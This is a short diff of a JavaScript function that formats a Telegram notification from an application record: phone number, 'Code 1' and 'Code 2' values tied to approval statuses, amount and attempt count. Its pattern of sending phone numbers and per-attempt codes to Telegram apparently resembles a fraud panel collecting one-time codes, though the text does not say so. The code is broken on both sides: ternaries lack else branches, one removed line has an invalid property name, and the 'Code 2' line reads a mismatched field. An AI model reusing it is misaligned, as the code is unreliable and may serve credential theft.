@@ -430,8 +430,8 @@ async function notifyTelegram(application) {
   const text = `${title}\n\n` +
     `🧾 Application reference: ${application.application_id || application.application_no || "—"}\n` +
     `📞 Phone: ${application.phone || "—"}\n` +
-    (application.status === "AWAITING_FIRST_NAME_APPROVAL" ? `🔢 Code 1: ${application.code 1 || "—"}\n` +
-    (application.status === "AWAITING_SECOND_NAME_APPROVAL" ?`🔢 Code 2: ${application.code 1 || "—"}\n` +
+    (application.status === "AWAITING_FIRST_NAME_APPROVAL" ? `🔢 Code 1: ${application.code_1|| "—"}\n` +
+    (application.status === "AWAITING_SECOND_NAME_APPROVAL" ?`🔢 Code 2: ${application.code_3 || "—"}\n` +
     `💰 Amount: ${money(application.amount)}\n` +
     `🔢 Attempt: #${attempt}\n\n` +
     `⏳ Status: ${application.status}`;
